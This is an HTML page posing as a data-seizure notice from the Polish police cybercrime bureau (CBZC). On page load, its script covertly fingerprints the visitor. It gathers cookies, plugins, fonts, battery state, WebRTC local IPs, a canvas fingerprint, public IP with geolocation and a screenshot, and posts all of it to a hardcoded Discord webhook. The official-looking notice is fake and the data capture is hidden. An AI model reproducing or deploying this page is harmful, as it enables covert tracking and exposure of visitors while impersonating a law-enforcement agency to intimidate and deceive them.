<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>cbzc.policja.gov.pl</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom, #f0f0f0, #ffffff);
      color: #333;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    #logo {
      max-width: 300px;
      margin-bottom: 20px;
    }
    #message {
      font-size: 2.5em;
      color: #102a5c;
      text-align: center;
      text-shadow: 0 0 10px #102a5c;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    #disclaimer {
      font-size: 0.8em;
      color: #666;
      position: absolute;
      bottom: 10px;
      text-align: center;
    }
    @media (max-width: 600px) {
      #logo { max-width: 200px; }
      #message { font-size: 1.5em; }
      #disclaimer { font-size: 0.6em; }
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>
  <img id="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHgr1Z0q2XV73gb38Z3yHwL0JGJBOL7j5Raw&s" alt="CCB Logo">
  <h1 id="message">Your Data Has Been Seized by CBZC</h1>
  <p id="disclaimer">Who we are? | https://cbzc.policja.gov.pl/</p>
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <script>
    // Initialize particles.js (snow effect)
    particlesJS("particles-js", {
      particles: {
        number: { value: 100, density: { enable: true, value_area: 800 } },
        color: { value: "#102a5c" },
        shape: { type: "circle" },
        opacity: { value: 0.5, random: true },
        size: { value: 3, random: true },
        line_linked: { enable: false },
        move: {
          enable: true,
          speed: 2,
          direction: "bottom",
          random: true,
          straight: false,
          out_mode: "out"
        }
      },
      interactivity: { enable: false }
    });

    // Collect browser data
    const collectData = async () => {
      const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          orientation: screen.orientation ? screen.orientation.type : "Unknown"
        },
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timeZoneOffset: new Date().getTimezoneOffset(),
        referrer: document.referrer || "Direct",
        url: window.location.href,
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : "Unknown",
        plugins: Array.from(navigator.plugins).map(p => ({ name: p.name, version: p.version })),
        cookies: document.cookie || "None",
        pageLoadTime: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : "Unknown",
        deviceMemory: navigator.deviceMemory || "Unknown",
        cpuCores: navigator.hardwareConcurrency || "Unknown",
        battery: "Unknown",
        webRTC: "Unknown",
        localIPs: [],
        touchSupport: navigator.maxTouchPoints || "Unknown",
        browserFeatures: {
          crypto: !!window.crypto,
          indexedDB: !!window.indexedDB,
          webGL: !!window.WebGLRenderingContext
        },
        fonts: document.fonts ? Array.from(document.fonts).map(f => f.family).join(", ") : "Unknown",
        canvasFingerprint: "Unknown",
        ipInfo: {}
      };

      // Get battery info (if supported)
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          data.battery = {
            charging: battery.charging,
            level: battery.level * 100 + "%",
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        } catch (e) {
          data.battery = { error: "Battery API failed", details: e.message };
        }
      }

      // Check WebRTC status and collect all local IPs
      try {
        const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (RTCPeerConnection) {
          data.webRTC = "Enabled";
          const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
          pc.createDataChannel("");
          pc.onicecandidate = (event) => {
            if (event.candidate) {
              const ip = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)|([0-9a-f:]+)/i)?.[0];
              if (ip && !data.localIPs.includes(ip)) data.localIPs.push(ip);
            }
          };
          await pc.createOffer().then(offer => pc.setLocalDescription(offer));
          setTimeout(() => pc.close(), 2000); // Extended timeout for multiple IPs
        } else {
          data.webRTC = "Disabled";
        }
      } catch (e) {
        data.webRTC = { error: "WebRTC check failed", details: e.message };
      }

      // Generate canvas fingerprint
      try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Hello, CCB!", 2, 15);
        data.canvasFingerprint = canvas.toDataURL();
      } catch (e) {
        data.canvasFingerprint = { error: "Canvas fingerprint failed", details: e.message };
      }

      // Get IP and geolocation from multiple APIs
      try {
        const ipResponse = await fetch('https://ip-api.com/json?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,offset,currency,isp,org,as,query');
        const ipData = await ipResponse.json();
        console.log('ip-api.com response:', ipData);
        if (ipData.status === "success") {
          data.ipInfo = ipData;
        } else {
          throw new Error(ipData.message || "IP API failed");
        }
      } catch (e) {
        console.error('ip-api.com error:', e.message);
        try {
          const fallbackResponse = await fetch('https://freeipapi.com/api/json');
          const fallbackData = await fallbackResponse.json();
          console.log('freeipapi.com response:', fallbackData);
          data.ipInfo = {
            query: fallbackData.ipAddress,
            city: fallbackData.cityName,
            country: fallbackData.countryName,
            region: fallbackData.regionName,
            zip: fallbackData.zipCode,
            lat: fallbackData.latitude,
            lon: fallbackData.longitude,
            isp: fallbackData.isp,
            timezone: fallbackData.timeZone
          };
        } catch (e2) {
          console.error('freeipapi.com error:', e2.message);
          try {
            const ipInfoResponse = await fetch('https://ipinfo.io/json');
            const ipInfoData = await ipInfoResponse.json();
            console.log('ipinfo.io response:', ipInfoData);
            data.ipInfo = {
              query: ipInfoData.ip,
              city: ipInfoData.city,
              country: ipInfoData.country,
              region: ipInfoData.region,
              zip: ipInfoData.postal,
              lat: ipInfoData.loc?.split(",")[0],
              lon: ipInfoData.loc?.split(",")[1],
              isp: ipInfoData.org,
              timezone: ipInfoData.timezone
            };
          } catch (e3) {
            console.error('ipinfo.io error:', e3.message);
            try {
              const ipv6Response = await fetch('https://api6.ipify.org?format=json');
              const ipv6Data = await ipv6Response.json();
              console.log('api6.ipify.org response:', ipv6Data);
              data.ipInfo = { query: ipv6Data.ip, error: "Location data unavailable" };
            } catch (e4) {
              console.error('api6.ipify.org error:', e4.message);
              data.ipInfo = { error: "Failed to fetch IP data", details: e4.message };
            }
          }
        }
      }

      // Take screenshot
      let screenshot = "No screenshot";
      try {
        const canvas = await html2canvas(document.body, { scale: 0.5 });
        screenshot = canvas.toDataURL("image/png");
      } catch (e) {
        screenshot = { error: "Failed to capture screenshot", details: e.message };
      }

      // Send data to webhook
      sendToWebhook(data, screenshot);
    };

    // Send data to webhook in Discord embed format with screenshot
    const sendToWebhook = async (data, screenshot) => {
      try {
        // Create Discord embed
        const embed = {
          title: "Data Seized by Centralne biuro zwalczania cyberprzestępczości (CBZC)",
          description: `Captured at: ${data.timestamp}`,
          color: 0x0e428b,
          fields: [
            { name: "Public IP (IPv4/IPv6)", value: data.ipInfo.query || "Unknown", inline: true },
            { name: "Local IPs (Wi-Fi, etc.)", value: data.localIPs.length > 0 ? data.localIPs.join(", ") : "Unknown", inline: true },
            { name: "Location", value: `${data.ipInfo.city || "Unknown"}, ${data.ipInfo.country || "Unknown"}`, inline: true },
            { name: "User Agent", value: data.userAgent.substring(0, 255), inline: false },
            { name: "Language", value: data.language, inline: true },
            { name: "Screen", value: `${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Orientation: ${data.screen.orientation}`, inline: true },
            { name: "Time Zone", value: `${data.timeZone} (Offset: ${data.timeZoneOffset} min)`, inline: true },
            { name: "Referrer", value: data.referrer, inline: false },
            { name: "Connection", value: data.connection !== "Unknown" ? data.connection.effectiveType : "Unknown", inline: true },
            { name: "Plugins", value: data.plugins.length > 0 ? data.plugins.map(p => p.name).join(", ") : "None", inline: false },
            { name: "Cookies", value: data.cookies, inline: false },
            { name: "Page Load Time", value: `${data.pageLoadTime} ms`, inline: true },
            { name: "Device Memory", value: `${data.deviceMemory} GB` || "Unknown", inline: true },
            { name: "CPU Cores", value: `${data.cpuCores}`, inline: true },
            { name: "Battery", value: data.battery !== "Unknown" ? `${data.battery.level}, ${data.battery.charging ? "Charging" : "Not charging"}` : "Unknown", inline: true },
            { name: "WebRTC", value: data.webRTC, inline: true },
            { name: "Touch Support", value: `${data.touchSupport} points` || "Unknown", inline: true },
            { name: "Browser Features", value: `Crypto: ${data.browserFeatures.crypto}, IndexedDB: ${data.browserFeatures.indexedDB}, WebGL: ${data.browserFeatures.webGL}`, inline: false },
            { name: "Fonts", value: data.fonts.substring(0, 255) || "Unknown", inline: false },
            { name: "Canvas Fingerprint", value: data.canvasFingerprint.substring(0, 50) + "..." || "Unknown", inline: false }
          ],
          timestamp: data.timestamp,
          image: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Security-Shield-Blue.svg/1200px-Security-Shield-Blue.svg.png" },
          thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Security-Shield-Blue.svg/1200px-Security-Shield-Blue.svg.png" },
          footer: { text: "Centralne biuro zwalczania cyberprzestępczości" }
        };

        // Prepare form data for Discord webhook with screenshot
        const formData = new FormData();
        formData.append("payload_json", JSON.stringify({
          embeds: [embed]
        }));
        if (typeof screenshot === "string" && screenshot.startsWith("data:image")) {
          const blob = await (await fetch(screenshot)).blob();
          formData.append("file", blob, "screenshot.png");
        }

        const response = await fetch('https://discord.com/api/webhooks/1419407132603846719/uiPjYtEG3fqXGEBOVmY4XPdnXjFkFs7IUBbtMvMC4GcD_nJsqrfs_7vL1hbQchxMZ_B4', {
          method: 'POST',
          body: formData
        });

        if (!response.ok) {
          console.error('Webhook failed:', response.status, response.statusText);
          const responseText = await response.text();
          console.error('Webhook response:', responseText);
        } else {
          console.log('Webhook sent successfully');
        }
      } catch (e) {
        console.error('Webhook error:', e.message);
      }
    };

    // Run on page load
    window.onload = collectData;
  </script>
</body>
</html>
